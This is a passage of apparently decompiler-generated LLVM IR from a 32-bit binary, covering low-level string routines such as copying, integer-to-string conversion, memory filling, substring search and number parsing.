dec_label_pc_404218:                              ; preds = %dec_label_pc_404208
  ret i32 %v1_404208

; uselistorder directives
  uselistorder i32 %v0_40420c, { 1, 0 }
}

define i32 @function_404224(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404224:
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_404228

dec_label_pc_404228:                              ; preds = %dec_label_pc_404228, %dec_label_pc_404224
  %v0_404228 = phi i32 [ %v3_404230, %dec_label_pc_404228 ], [ %tmp, %dec_label_pc_404224 ]
  %v1_404228 = inttoptr i32 %v0_404228 to i8*
  %v2_404228 = load i8, i8* %v1_404228, align 1
  %v3_404228 = sext i8 %v2_404228 to i32
  store i32 %v3_404228, i32* %v0.global-to-local, align 4
  %v1_404230 = icmp eq i8 %v2_404228, 0
  %v3_404230 = add i32 %v0_404228, 1
  br i1 %v1_404230, label %dec_label_pc_404234, label %dec_label_pc_404228

dec_label_pc_404234:                              ; preds = %dec_label_pc_404228
  store i32 %v0_404228, i32* @v1, align 4
  br label %dec_label_pc_40423c

dec_label_pc_40423c:                              ; preds = %dec_label_pc_40423c, %dec_label_pc_404234
  %v2_404244 = phi i32 [ %v3_404248, %dec_label_pc_40423c ], [ %v0_404228, %dec_label_pc_404234 ]
  %v0_40423c = load i32, i32* @a1, align 4
  %v1_40423c = inttoptr i32 %v0_40423c to i8*
  %v2_40423c = load i8, i8* %v1_40423c, align 1
  %v3_40423c = sext i8 %v2_40423c to i32
  store i32 %v3_40423c, i32* %v0.global-to-local, align 4
  %v1_404240 = add i32 %v0_40423c, 1
  store i32 %v1_404240, i32* @a1, align 4
  %v3_404244 = inttoptr i32 %v2_404244 to i8*
  store i8 %v2_40423c, i8* %v3_404244, align 1
  %v0_404248 = load i32, i32* %v0.global-to-local, align 4
  %v1_404248 = icmp eq i32 %v0_404248, 0
  %v2_404248 = load i32, i32* @v1, align 4
  %v3_404248 = add i32 %v2_404248, 1
  store i32 %v3_404248, i32* @v1, align 4
  br i1 %v1_404248, label %dec_label_pc_40424c, label %dec_label_pc_40423c

dec_label_pc_40424c:                              ; preds = %dec_label_pc_40423c
  store i32 %tmp, i32* %v0.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_404248, { 1, 0 }
  uselistorder i32 %v0_404228, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
}

define i32 @function_404258() local_unnamed_addr {
dec_label_pc_404258:
  %v0_404258 = load i32, i32* @v0, align 4
  ret i32 %v0_404258
}

define i32 @function_40425c() local_unnamed_addr {
dec_label_pc_40425c:
  %v1.global-to-local = alloca i32, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v3_404268.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_404260

dec_label_pc_404260:                              ; preds = %dec_label_pc_404260, %dec_label_pc_40425c
  %v3_404268 = phi i32 [ %v1_40426c, %dec_label_pc_404260 ], [ %v3_404268.pre, %dec_label_pc_40425c ]
  %v0_404260 = load i32, i32* @a1, align 4
  %v1_404260 = inttoptr i32 %v0_404260 to i8*
  %v2_404260 = load i8, i8* %v1_404260, align 1
  %v1_404264 = add i32 %v0_404260, 1
  store i32 %v1_404264, i32* @a1, align 4
  %v4_404268 = inttoptr i32 %v3_404268 to i8*
  store i8 %v2_404260, i8* %v4_404268, align 1
  %v0_40426c = load i32, i32* @a0, align 4
  %v1_40426c = add i32 %v0_40426c, 1
  store i32 %v1_40426c, i32* @a0, align 4
  %v0_404270 = load i32, i32* @a2, align 4
  %v1_404270 = add i32 %v0_404270, -1
  store i32 %v1_404270, i32* @a2, align 4
  %v1_404274 = load i32, i32* %v1.global-to-local, align 4
  %v2_404274 = icmp eq i32 %v1_404270, %v1_404274
  br i1 %v2_404274, label %dec_label_pc_404278, label %dec_label_pc_404260

dec_label_pc_404278:                              ; preds = %dec_label_pc_404260
  %v2_40427c = sext i8 %v2_404260 to i32
  ret i32 %v2_40427c

; uselistorder directives
  uselistorder i32 %v1_40426c, { 1, 0 }
}

define i32 @function_404284(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404284:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %s0.global-to-local, align 4
  %v0_4042ac.pre = load i32, i32* @a2, align 4
  br label %dec_label_pc_4042ac

dec_label_pc_4042ac:                              ; preds = %dec_label_pc_4042ac, %dec_label_pc_404284
  %v2_4042b8 = phi i32 [ %v3_4042b8, %dec_label_pc_4042ac ], [ %tmp, %dec_label_pc_404284 ]
  %v0_4042ac = phi i32 [ %v1_4042b4, %dec_label_pc_4042ac ], [ %v0_4042ac.pre, %dec_label_pc_404284 ]
  store i32 %v0_4042ac, i32* %s0.global-to-local, align 4
  %v1_4042b0 = inttoptr i32 %v2_4042b8 to i8*
  %v2_4042b0 = load i8, i8* %v1_4042b0, align 1
  %v3_4042b0 = sext i8 %v2_4042b0 to i32
  store i32 %v3_4042b0, i32* @v0, align 4
  %v1_4042b4 = add i32 %v0_4042ac, 1
  store i32 %v1_4042b4, i32* @a2, align 4
  %v1_4042b8 = icmp eq i8 %v2_4042b0, 0
  %v3_4042b8 = add i32 %v2_4042b8, 1
  br i1 %v1_4042b8, label %dec_label_pc_4042bc, label %dec_label_pc_4042ac

dec_label_pc_4042bc:                              ; preds = %dec_label_pc_4042ac
  %v1_4042c8 = call i32 @function_404258()
  %v0_4042d0 = load i32, i32* %s0.global-to-local, align 4
  ret i32 %v0_4042d0

; uselistorder directives
  uselistorder i32 %v1_4042b4, { 1, 0 }
  uselistorder i32 %v0_4042ac, { 1, 0 }
  uselistorder i32 ()* @function_404258, { 1, 2, 0 }
}

define i32 @function_4042e8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4042e8:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %v1_4042e8 = mul i32 %arg1, 16777216
  %v1_4042ec = sdiv i32 %v1_4042e8, 16777216
  store i32 %v1_4042ec, i32* %a1.global-to-local, align 4
  %v2_4042f8.pre = load i32, i32* @a0, align 4
  %extract.t8 = trunc i32 %v1_4042ec to i8
  %v3_4042f89 = inttoptr i32 %v2_4042f8.pre to i8*
  store i8 %extract.t8, i8* %v3_4042f89, align 1
  %v0_4042fc10 = load i32, i32* @a0, align 4
  %v1_4042fc11 = add i32 %v0_4042fc10, 1
  store i32 %v1_4042fc11, i32* %a0.global-to-local, align 4
  %v0_40430012 = load i32, i32* @a2, align 4
  %v1_40430013 = add i32 %v0_40430012, -1
  store i32 %v1_40430013, i32* @a2, align 4
  %v2_40430414 = icmp eq i32 %v0_40430012, 0
  br i1 %v2_40430414, label %dec_label_pc_404308, label %dec_label_pc_4042f8.dec_label_pc_4042f8_crit_edge

dec_label_pc_4042f8.dec_label_pc_4042f8_crit_edge: ; preds = %dec_label_pc_4042e8, %dec_label_pc_4042f8.dec_label_pc_4042f8_crit_edge
  %v1_4042fc15 = phi i32 [ %v1_4042fc, %dec_label_pc_4042f8.dec_label_pc_4042f8_crit_edge ], [ %v1_4042fc11, %dec_label_pc_4042e8 ]
  %v0_4042f8.pre = load i32, i32* %a1.global-to-local, align 4
  %extract.t = trunc i32 %v0_4042f8.pre to i8
  %v3_4042f8 = inttoptr i32 %v1_4042fc15 to i8*
  store i8 %extract.t, i8* %v3_4042f8, align 1
  %v0_4042fc = load i32, i32* %a0.global-to-local, align 4
  %v1_4042fc = add i32 %v0_4042fc, 1
  store i32 %v1_4042fc, i32* %a0.global-to-local, align 4
  %v0_404300 = load i32, i32* @a2, align 4
  %v1_404300 = add i32 %v0_404300, -1
  store i32 %v1_404300, i32* @a2, align 4
  %v2_404304 = icmp eq i32 %v0_404300, 0
  br i1 %v2_404304, label %dec_label_pc_404308, label %dec_label_pc_4042f8.dec_label_pc_4042f8_crit_edge

dec_label_pc_404308:                              ; preds = %dec_label_pc_4042f8.dec_label_pc_4042f8_crit_edge, %dec_label_pc_4042e8
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_4042fc, { 1, 0 }
  uselistorder i32 %v1_4042ec, { 1, 0 }
  uselistorder i32* %a0.global-to-local, { 2, 1, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 5, 4, 7, 6 }
  uselistorder label %dec_label_pc_4042f8.dec_label_pc_4042f8_crit_edge, { 1, 0 }
}

define i32 @function_404314(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_404314:
  %a0.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %lo.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %t1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %tmp, i32* @a2, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_404330 = load i32, i32* @a2, align 4
  %v1_404330 = icmp eq i32 %v0_404330, 0
  store i32 %v0_404330, i32* @s0, align 4
  br i1 %v1_404330, label %dec_label_pc_4043f0, label %dec_label_pc_404334

dec_label_pc_404334:                              ; preds = %dec_label_pc_404314
  %v0_404338 = load i32, i32* %a0.global-to-local, align 4
  %v1_404338 = icmp eq i32 %v0_404338, 0
  br i1 %v1_404338, label %dec_label_pc_4043e8, label %dec_label_pc_40433c

dec_label_pc_40433c:                              ; preds = %dec_label_pc_404334
  %v2_404344 = icmp ne i32 %arg2, 10
  store i32 0, i32* %t0.global-to-local, align 4
  %v1_40434c = icmp sgt i32 %v0_404338, -1
  %or.cond = or i1 %v2_404344, %v1_40434c
  br i1 %or.cond, label %dec_label_pc_40435c, label %dec_label_pc_404350

dec_label_pc_404350:                              ; preds = %dec_label_pc_40433c
  %v1_404354 = sub i32 0, %v0_404338
  store i32 %v1_404354, i32* %a0.global-to-local, align 4
  store i32 1, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_40435c

dec_label_pc_40435c:                              ; preds = %dec_label_pc_40433c, %dec_label_pc_404350
  %v2_40436c2 = phi i32 [ %v0_404338, %dec_label_pc_40433c ], [ %v1_404354, %dec_label_pc_404350 ]
  store i32 32, i32* %a2.global-to-local, align 4
  %v2_404360 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_404360, i32* %t1.global-to-local, align 4
  br label %dec_label_pc_40436c

dec_label_pc_40436c:                              ; preds = %dec_label_pc_404398, %dec_label_pc_40435c
  %v1_404398 = phi i32 [ %v1_4043a0, %dec_label_pc_404398 ], [ 32, %dec_label_pc_40435c ]
  %v2_40438c = phi i32 [ %v0_4043a4, %dec_label_pc_404398 ], [ %v2_40436c2, %dec_label_pc_40435c ]
  %v4_40436c = sdiv i32 %v2_40438c, %arg2
  store i32 %v4_40436c, i32* %lo.global-to-local, align 4
  %v5_40436c = srem i32 %v2_40438c, %arg2
  %v1_40437c = icmp slt i32 %v5_40436c, 10
  %v3_404380 = add i32 %v5_40436c, 48
  %extract.t9 = trunc i32 %v3_404380 to i8
  br i1 %v1_40437c, label %dec_label_pc_404398, label %dec_label_pc_404384

dec_label_pc_404384:                              ; preds = %dec_label_pc_40436c
  %v1_404388 = add i32 %v5_40436c, 55
  store i32 %v4_40436c, i32* %lo.global-to-local, align 4
  %extract.t = trunc i32 %v1_404388 to i8
  br label %dec_label_pc_404398

dec_label_pc_404398:                              ; preds = %dec_label_pc_404384, %dec_label_pc_40436c
  %v0_40439c.off0 = phi i8 [ %extract.t, %dec_label_pc_404384 ], [ %extract.t9, %dec_label_pc_40436c ]
  %v0_404398 = load i32, i32* %t1.global-to-local, align 4
  %v2_404398 = add i32 %v0_404398, %v1_404398
  %v3_40439c = inttoptr i32 %v2_404398 to i8*
  store i8 %v0_40439c.off0, i8* %v3_40439c, align 1
  %v0_4043a0 = load i32, i32* %a2.global-to-local, align 4
  %v1_4043a0 = add i32 %v0_4043a0, -1
  store i32 %v1_4043a0, i32* %a2.global-to-local, align 4
  %v0_4043a4 = load i32, i32* %lo.global-to-local, align 4
  store i32 %v0_4043a4, i32* %a0.global-to-local, align 4
  %v1_4043a8 = icmp eq i32 %v0_4043a4, 0
  br i1 %v1_4043a8, label %dec_label_pc_4043ac, label %dec_label_pc_40436c

dec_label_pc_4043ac:                              ; preds = %dec_label_pc_404398
  %v0_4043b0 = load i32, i32* %t0.global-to-local, align 4
  %v1_4043b0 = icmp eq i32 %v0_4043b0, 0
  br i1 %v1_4043b0, label %dec_label_pc_4043c4, label %dec_label_pc_4043b4

dec_label_pc_4043b4:                              ; preds = %dec_label_pc_4043ac
  %v2_4043b0 = load i32, i32* @sp, align 4
  %v4_4043b0 = add i32 %v2_4043b0, %v1_4043a0
  %v3_4043c0 = add i32 %v4_4043b0, 24
  %v4_4043c0 = inttoptr i32 %v3_4043c0 to i8*
  store i8 45, i8* %v4_4043c0, align 1
  %v0_4043c4.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4043c4

dec_label_pc_4043c4:                              ; preds = %dec_label_pc_4043ac, %dec_label_pc_4043b4
  %v0_4043c4 = phi i32 [ %v1_4043a0, %dec_label_pc_4043ac ], [ %v0_4043c4.pre, %dec_label_pc_4043b4 ]
  %v1_4043c4 = add i32 %v0_4043c4, 1
  store i32 %v1_4043c4, i32* @a2, align 4
  %v3_4043c8 = load i32, i32* @global_var_4492ec.193, align 4
  store i32 %v3_4043c8, i32* @t9, align 4
  %v2_4043d0 = add i32 %v1_4043c4, %v2_404360
  %v1_4043d4 = load i32, i32* @s0, align 4
  %v2_4043d4 = inttoptr i32 %v1_4043d4 to i8*
  store i32 %v1_4043d4, i32* %a0.global-to-local, align 4
  %v7_4043d4 = call i32 @function_404284(i8* %v2_4043d4, i32 %v2_4043d0)
  %v0_4043e4 = load i32, i32* @s0, align 4
  %v2_4043e8.pre = load i32, i32* @a2, align 4
  %extract.t10 = trunc i32 %v0_4043e4 to i8
  br label %dec_label_pc_4043e8

dec_label_pc_4043e8:                              ; preds = %dec_label_pc_404334, %dec_label_pc_4043c4
  %v2_4043e8 = phi i32 [ %v0_404330, %dec_label_pc_404334 ], [ %v2_4043e8.pre, %dec_label_pc_4043c4 ]
  %v0_4043e8.off0 = phi i8 [ 48, %dec_label_pc_404334 ], [ %extract.t10, %dec_label_pc_4043c4 ]
  %v3_4043e8 = inttoptr i32 %v2_4043e8 to i8*
  store i8 %v0_4043e8.off0, i8* %v3_4043e8, align 1
  %v0_4043ec = load i32, i32* @a2, align 4
  %v1_4043ec = add i32 %v0_4043ec, 1
  %v2_4043ec = inttoptr i32 %v1_4043ec to i8*
  store i8 0, i8* %v2_4043ec, align 1
  %v0_4043f0.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_4043f0

dec_label_pc_4043f0:                              ; preds = %dec_label_pc_404314, %dec_label_pc_4043e8
  %v0_4043f0 = phi i32 [ 0, %dec_label_pc_404314 ], [ %v0_4043f0.pre, %dec_label_pc_4043e8 ]
  ret i32 %v0_4043f0

; uselistorder directives
  uselistorder i32 %v1_4043d4, { 1, 0 }
  uselistorder i32 %v0_4043a4, { 1, 2, 0 }
  uselistorder i32 %v1_4043a0, { 1, 0, 3, 2 }
  uselistorder i32 %v5_40436c, { 0, 2, 1 }
  uselistorder i32 %v2_40438c, { 1, 0 }
  uselistorder i32 %v0_404338, { 0, 2, 1, 3 }
  uselistorder i32* %t0.global-to-local, { 1, 0, 2 }
  uselistorder i32* %lo.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i8*, i32)* @function_404284, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_4043f0, { 1, 0 }
  uselistorder label %dec_label_pc_4043e8, { 1, 0 }
  uselistorder label %dec_label_pc_4043c4, { 1, 0 }
  uselistorder label %dec_label_pc_40435c, { 1, 0 }
}

define i32 @function_404404(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404404:
  store i32 %arg4, i32* @a3, align 4
  %v2_404404 = icmp sgt i32 %arg4, %arg2
  br i1 %v2_404404, label %dec_label_pc_40445c, label %dec_label_pc_40440c

dec_label_pc_40440c:                              ; preds = %dec_label_pc_404404
  %v0_404418.pre = load i32, i32* @v1, align 4
  %v0_40441c.pre = load i32, i32* @t1, align 4
  br label %dec_label_pc_404418

dec_label_pc_404418:                              ; preds = %dec_label_pc_404448, %dec_label_pc_40440c
  %v0_40442c = phi i32 [ %v3_404454, %dec_label_pc_404448 ], [ 0, %dec_label_pc_40440c ]
  %v3_40442c = phi i32 [ %v1_404450, %dec_label_pc_404448 ], [ 0, %dec_label_pc_40440c ]
  %v0_40441c = phi i32 [ %v2_40444c, %dec_label_pc_404448 ], [ %v0_40441c.pre, %dec_label_pc_40440c ]
  %v0_404418 = phi i32 [ %v2_404450, %dec_label_pc_404448 ], [ %v0_404418.pre, %dec_label_pc_40440c ]
  %v1_404418 = inttoptr i32 %v0_404418 to i8*
  %v2_404418 = load i8, i8* %v1_404418, align 1
  %v1_40441c = inttoptr i32 %v0_40441c to i8*
  %v2_40441c = load i8, i8* %v1_40441c, align 1
  %v2_404424 = icmp eq i8 %v2_404418, %v2_40441c
  br i1 %v2_404424, label %dec_label_pc_404428, label %dec_label_pc_404440

dec_label_pc_404428:                              ; preds = %dec_label_pc_404418
  %v2_40442c = icmp eq i32 %v0_40442c, %arg4
  %v4_40442c = add i32 %v3_40442c, 1
  br i1 %v2_40442c, label %dec_label_pc_404430, label %dec_label_pc_404448

dec_label_pc_404430:                              ; preds = %dec_label_pc_404428
  ret i32 %v4_40442c

dec_label_pc_404440:                              ; preds = %dec_label_pc_404418
  %v1_404444 = add i32 %v3_40442c, 1
  br label %dec_label_pc_404448

dec_label_pc_404448:                              ; preds = %dec_label_pc_404428, %dec_label_pc_404440
  %v2_404454 = phi i32 [ %v0_40442c, %dec_label_pc_404428 ], [ 0, %dec_label_pc_404440 ]
  %v1_404450 = phi i32 [ %v4_40442c, %dec_label_pc_404428 ], [ %v1_404444, %dec_label_pc_404440 ]
  %v2_404448 = icmp slt i32 %v1_404450, %arg2
  %v2_40444c = add i32 %v2_404454, %arg3
  %v2_404450 = add i32 %v1_404450, %arg1
  %v1_404454 = icmp eq i1 %v2_404448, false
  %v3_404454 = add i32 %v2_404454, 1
  br i1 %v1_404454, label %dec_label_pc_40445c, label %dec_label_pc_404418

dec_label_pc_40445c:                              ; preds = %dec_label_pc_404448, %dec_label_pc_404404
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_404450, { 0, 2, 1 }
  uselistorder i32 %v2_404454, { 1, 0 }
  uselistorder i32 %v4_40442c, { 1, 0 }
  uselistorder i32 %v3_40442c, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404448, { 1, 0 }
}

define i32 @function_404464(i64 %arg1) local_unnamed_addr {
dec_label_pc_404464:
  %tmp = trunc i64 %arg1 to i32
  %v0_404470.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_404470

dec_label_pc_404470:                              ; preds = %dec_label_pc_404470, %dec_label_pc_404470, %dec_label_pc_404484, %dec_label_pc_404464
  %v0_404470 = phi i32 [ %v0_404470.pre, %dec_label_pc_404464 ], [ %v1_404474, %dec_label_pc_404484 ], [ %v1_404474, %dec_label_pc_404470 ], [ %v1_404474, %dec_label_pc_404470 ]
  %v1_404470 = inttoptr i32 %v0_404470 to i8*
  %v2_404470 = load i8, i8* %v1_404470, align 1
  %v3_404470 = sext i8 %v2_404470 to i32
  %v1_404474 = add i32 %v0_404470, 1
  switch i8 %v2_404470, label %dec_label_pc_404484 [
    i8 32, label %dec_label_pc_404470
    i8 9, label %dec_label_pc_404470
  ]

dec_label_pc_404484:                              ; preds = %dec_label_pc_404470
  %v2_404488 = icmp eq i8 %v2_404470, 10
  br i1 %v2_404488, label %dec_label_pc_404470, label %dec_label_pc_40448c

dec_label_pc_40448c:                              ; preds = %dec_label_pc_404484
  %v1_40449c = add i32 %v0_404470, 2
  br label %dec_label_pc_4044a8

dec_label_pc_4044a8:                              ; preds = %dec_label_pc_40459c, %dec_label_pc_40448c
  %v1_4045c820 = phi i32 [ %v1_4045a4, %dec_label_pc_40459c ], [ 10, %dec_label_pc_40448c ]
  %v0_4044b4 = phi i32 [ %v0_4044b4824, %dec_label_pc_40459c ], [ %v1_40449c, %dec_label_pc_40448c ]
  %v0_4044ac = phi i32 [ %v0_4045a823, %dec_label_pc_40459c ], [ %v3_404470, %dec_label_pc_40448c ]
  %v2_4044ac = icmp eq i32 %v0_4044ac, 43
  br i1 %v2_4044ac, label %dec_label_pc_4044b0, label %dec_label_pc_4045c8

dec_label_pc_4044b0:                              ; preds = %dec_label_pc_4044a8
  %v1_4044b4 = inttoptr i32 %v0_4044b4 to i8*
  %v2_4044b4 = load i8, i8* %v1_4044b4, align 1
  %v3_4044b4 = sext i8 %v2_4044b4 to i32
  %v1_4044bc = add i32 %v0_4044b4, 1
  %v6_4044c0 = sdiv i32 43, %tmp
  %v7_4044c0 = srem i32 43, %tmp
  %v1_4044dc = urem i32 %v3_4044b4, 256
  %fold = add nsw i32 %v3_4044b4, 208
  %v1_4044e4 = and i32 %fold, 254
  %v1_4044e8 = icmp ult i32 %v1_4044e4, 10
  %v1_4044ec = icmp eq i1 %v1_4044e8, false
  %v3_4044ec = add nuw nsw i32 %v1_4044dc, 191
  br i1 %v1_4044ec, label %dec_label_pc_4044fc, label %dec_label_pc_4044f0

dec_label_pc_4044f0:                              ; preds = %dec_label_pc_4044b0
  %v1_4044f8 = add nsw i32 %v3_4044b4, -48
  br label %dec_label_pc_4044fc

dec_label_pc_4044fc:                              ; preds = %dec_label_pc_4044b0, %dec_label_pc_4044f0
  %v0_40450c = phi i32 [ %v1_4044dc, %dec_label_pc_4044b0 ], [ %v1_4044f8, %dec_label_pc_4044f0 ]
  %v1_4044fc = and i32 %v3_4044ec, 254
  %v1_404500 = icmp ult i32 %v1_4044fc, 26
  br i1 %v1_404500, label %dec_label_pc_404520, label %dec_label_pc_404508

dec_label_pc_404508:                              ; preds = %dec_label_pc_4044fc
  %v1_40450c = add nsw i32 %v0_40450c, 159
  %v1_404510 = and i32 %v1_40450c, 254
  %v1_404514 = icmp ult i32 %v1_404510, 26
  %v1_404518 = icmp eq i1 %v1_404514, false
  br i1 %v1_404518, label %dec_label_pc_40459c, label %dec_label_pc_404520

dec_label_pc_404520:                              ; preds = %dec_label_pc_404508, %dec_label_pc_4044fc
  %v1_404520 = phi i32 [ 87, %dec_label_pc_404508 ], [ 55, %dec_label_pc_4044fc ]
  %v2_404520 = sub nsw i32 %v3_4044b4, %v1_404520
  %v3_404524 = icmp slt i32 %v2_404520, %tmp
  %v4_404524 = zext i1 %v3_404524 to i32
  %v1_404528 = icmp eq i1 %v3_404524, false
  br i1 %v1_404528, label %dec_label_pc_40459c, label %dec_label_pc_40452c

dec_label_pc_40452c:                              ; preds = %dec_label_pc_404520
  %v4_404530 = icmp slt i32 %v6_4044c0, 0
  %v1_404538 = icmp eq i1 %v4_404530, false
  br i1 %v1_404538, label %dec_label_pc_40453c, label %dec_label_pc_40458c

dec_label_pc_40453c:                              ; preds = %dec_label_pc_40452c
  %v2_404540 = icmp eq i32 %v6_4044c0, 0
  br i1 %v2_404540, label %dec_label_pc_404544, label %dec_label_pc_404554

dec_label_pc_404544:                              ; preds = %dec_label_pc_40453c
  %v2_404548 = icmp slt i32 %v7_4044c0, %v2_404520
  br i1 %v2_404548, label %dec_label_pc_40458c, label %dec_label_pc_404554

dec_label_pc_404554:                              ; preds = %dec_label_pc_404544, %dec_label_pc_40453c
  br label %dec_label_pc_40458c

dec_label_pc_40458c:                              ; preds = %dec_label_pc_40452c, %dec_label_pc_404544, %dec_label_pc_404554
  %v1_404570 = add i32 %v0_4044b4, 2
  br label %dec_label_pc_40459c

dec_label_pc_40459c:                              ; preds = %dec_label_pc_404508, %dec_label_pc_404520, %dec_label_pc_40458c
  %v0_4044b4824 = phi i32 [ %v1_404570, %dec_label_pc_40458c ], [ %v1_4044bc, %dec_label_pc_404520 ], [ %v1_4044bc, %dec_label_pc_404508 ]
  %v0_4045a823 = phi i32 [ %v2_404520, %dec_label_pc_40458c ], [ %v2_404520, %dec_label_pc_404520 ], [ %v0_40450c, %dec_label_pc_404508 ]
  %v1_4045a8 = phi i32 [ 2147418112, %dec_label_pc_40458c ], [ %v4_404524, %dec_label_pc_404520 ], [ 87, %dec_label_pc_404508 ]
  %v0_4045a4 = phi i32 [ 2147483647, %dec_label_pc_40458c ], [ 0, %dec_label_pc_404520 ], [ 0, %dec_label_pc_404508 ]
  %v1_4045a4 = sub nsw i32 0, %v0_4045a4
  %v2_4045a8 = icmp eq i32 %v0_4045a823, %v1_4045a8
  br i1 %v2_4045a8, label %dec_label_pc_4045c8, label %dec_label_pc_4044a8

dec_label_pc_4045c8:                              ; preds = %dec_label_pc_4044a8, %dec_label_pc_40459c
  %v1_4045c822 = phi i32 [ %v1_4045a4, %dec_label_pc_40459c ], [ %v1_4045c820, %dec_label_pc_4044a8 ]
  ret i32 %v1_4045c822

; uselistorder directives
  uselistorder i32 %v1_4045a4, { 1, 0 }
  uselistorder i32 %v1_4044dc, { 1, 0 }
  uselistorder i32 %v3_4044b4, { 1, 2, 3, 0 }
  uselistorder i32 %v0_4044b4, { 0, 2, 1 }
  uselistorder i32 %v1_404474, { 2, 1, 0 }
  uselistorder i8 %v2_404470, { 1, 0, 2 }
  uselistorder i32 %v0_404470, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 55, { 1, 2, 0, 3 }
  uselistorder i32 43, { 1, 0, 2 }
  uselistorder label %dec_label_pc_4045c8, { 1, 0 }
  uselistorder label %dec_label_pc_40459c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_40458c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4044fc, { 1, 0 }
  uselistorder label %dec_label_pc_404470, { 2, 1, 0, 3 }
}

define i32 @function_4045d0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4045d0:
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %s1.global-to-local, align 4
  store i32 %arg2, i32* %s4.global-to-local, align 4
  store i32 %arg3, i32* %s3.global-to-local, align 4
  store i32 %tmp, i32* @s0, align 4
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_404610

dec_label_pc_404610:                              ; preds = %dec_label_pc_404644.dec_label_pc_404610_crit_edge, %dec_label_pc_4045d0
  %v0_404618 = phi i32 [ %v0_404618.pre, %dec_label_pc_404644.dec_label_pc_404610_crit_edge ], [ %arg3, %dec_label_pc_4045d0 ]
  %v0_404614 = phi i32 [ %v4_404630, %dec_label_pc_404644.dec_label_pc_404610_crit_edge ], [ %tmp, %dec_label_pc_4045d0 ]
  %v3_404610 = load i32, i32* @global_var_44939c.48, align 4
  store i32 %v3_404610, i32* @t9, align 4
  %tmp14 = inttoptr i32 %v0_404614 to i32*
  %v6_40461c = call i32 @function_404da0(i32 %v0_404618, i32* %tmp14, i32 1)
  %v0_404628 = load i32, i32* @s0, align 4
  %v2_404630 = icmp eq i32 %v6_40461c, 1
  %v4_404630 = add i32 %v0_404628, 1
  store i32 %v4_404630, i32* @s0, align 4
  %v0_404638 = load i32, i32* %s2.global-to-local, align 4
  br i1 %v2_404630, label %dec_label_pc_404634, label %dec_label_pc_404658

dec_label_pc_404634:                              ; preds = %dec_label_pc_404610
  %v1_404638 = add i32 %v0_404638, 1
  store i32 %v1_404638, i32* %s2.global-to-local, align 4
  %v1_40463c = load i32, i32* %s4.global-to-local, align 4
  %v2_40463c = icmp slt i32 %v1_404638, %v1_40463c
  %v1_404640 = icmp eq i1 %v2_40463c, false
  br i1 %v1_404640, label %dec_label_pc_404658, label %dec_label_pc_404644

dec_label_pc_404644:                              ; preds = %dec_label_pc_404634
  %v1_404648 = inttoptr i32 %v0_404628 to i8*
  %v2_404648 = load i8, i8* %v1_404648, align 1
  %v2_404650 = icmp eq i8 %v2_404648, 10
  br i1 %v2_404650, label %dec_label_pc_404658, label %dec_label_pc_404644.dec_label_pc_404610_crit_edge

dec_label_pc_404644.dec_label_pc_404610_crit_edge: ; preds = %dec_label_pc_404644
  %v0_404618.pre = load i32, i32* %s3.global-to-local, align 4
  br label %dec_label_pc_404610

dec_label_pc_404658:                              ; preds = %dec_label_pc_404610, %dec_label_pc_404634, %dec_label_pc_404644
  %v0_404658 = phi i32 [ %v1_404638, %dec_label_pc_404644 ], [ %v1_404638, %dec_label_pc_404634 ], [ %v0_404638, %dec_label_pc_404610 ]
  %v1_404658 = icmp eq i32 %v0_404658, 0
  %v2_404658 = load i32, i32* %s1.global-to-local, align 4
  br i1 %v1_404658, label %dec_label_pc_40465c, label %dec_label_pc_404668

dec_label_pc_40465c:                              ; preds = %dec_label_pc_404658
  store i32 0, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_404668

dec_label_pc_404668:                              ; preds = %dec_label_pc_404658, %dec_label_pc_40465c
  %v4_404680 = phi i32 [ %v2_404658, %dec_label_pc_404658 ], [ 0, %dec_label_pc_40465c ]
  ret i32 %v4_404680

; uselistorder directives
  uselistorder i32 %v4_404630, { 1, 0 }
  uselistorder label %dec_label_pc_404668, { 1, 0 }
